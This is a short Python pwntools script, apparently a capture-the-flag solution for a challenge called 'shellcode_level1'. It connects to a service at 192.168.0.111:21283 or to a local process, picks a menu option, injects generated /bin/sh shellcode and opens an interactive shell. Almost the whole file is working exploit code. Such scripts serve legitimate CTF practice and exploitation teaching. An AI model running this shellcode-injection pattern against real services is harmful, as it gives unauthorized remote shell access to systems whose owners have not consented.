from pwn import * 
from pwn import p64


debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./shellcode_level1")
    
else:
    host = "192.168.0.111:21283"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # gdb.attach(r,'b* 0x00401571')
    gdb.attach(r)
    pause()
    pass


# elf = ELF('./pwn')
shellcode = asm(shellcraft.sh())
r.sendlineafter(b'choose?',b'4')
r.sendlineafter(b'write?',shellcode)
r.interactive()
